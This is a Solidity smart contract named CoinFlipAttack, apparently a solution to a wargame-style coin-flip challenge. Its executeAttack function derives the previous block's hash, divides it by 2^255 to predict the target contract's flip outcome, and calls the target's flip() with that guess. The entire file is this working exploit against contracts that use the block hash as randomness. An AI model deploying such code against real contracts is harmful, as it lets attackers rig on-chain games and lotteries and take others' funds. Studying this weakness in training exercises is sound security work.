pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttack {
    uint256 public consecutiveWins;
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _token) {
        target = ICoinFlip(_token);
    }

    function executeAttack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
